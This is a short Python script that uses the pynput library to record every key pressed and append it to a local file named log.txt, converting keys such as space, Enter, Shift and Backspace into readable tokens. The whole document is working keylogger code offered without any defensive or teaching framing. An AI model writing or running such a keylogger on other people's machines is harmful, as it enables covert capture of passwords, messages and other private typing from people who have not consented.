from pynput.keyboard import Listener

def write_to_file(key):
    letter = str(key).replace("'", "")      # Converting key to string and removing the ' sign

    # Treating special characters
    if letter == 'Key.space':
        letter = ' '
    if letter == "Key.shift" or letter == "Key.shift_r":
        letter = " [Shift] "
    if letter == "Key.ctrl_l" or letter == "Key.ctrl_r":
        letter = " [Ctrl] "
    if letter == "Key.enter":
        letter = "\n"
    if letter == 'Key.backspace':
        letter = " [BACKSPACE] "
    if letter == 'Key.tab':
        letter = " [TAB] "

    # Writing the logs in log.txt file
    with open("log.txt", 'a') as f:
        f.write(letter)

# Start Listening to key logs
with Listener(on_press=write_to_file) as l:
    l.join()
